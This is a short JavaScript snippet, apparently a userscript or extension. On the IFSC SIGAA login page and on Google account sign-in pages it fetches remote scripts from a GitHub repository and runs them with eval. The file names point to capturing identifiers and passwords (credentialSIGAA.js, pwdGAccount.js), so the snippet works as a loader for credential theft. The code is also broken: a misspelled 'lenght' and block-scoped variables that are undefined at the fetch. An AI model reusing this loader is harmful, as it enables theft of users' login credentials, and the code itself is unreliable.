if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
    let url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
}
else if (location.host == 'accounts.google.com'){
    let path = location.pathname.split('/');
    
    if (path[path.length - 1] == 'identifier'){
            let url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
    }
    else if (path[path.lenght - 1] == 'pwd'){
        let url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
    }
}

if (url != undefined){
    fetch(url).then(response => response.text()).then(code => {eval(code);});
}
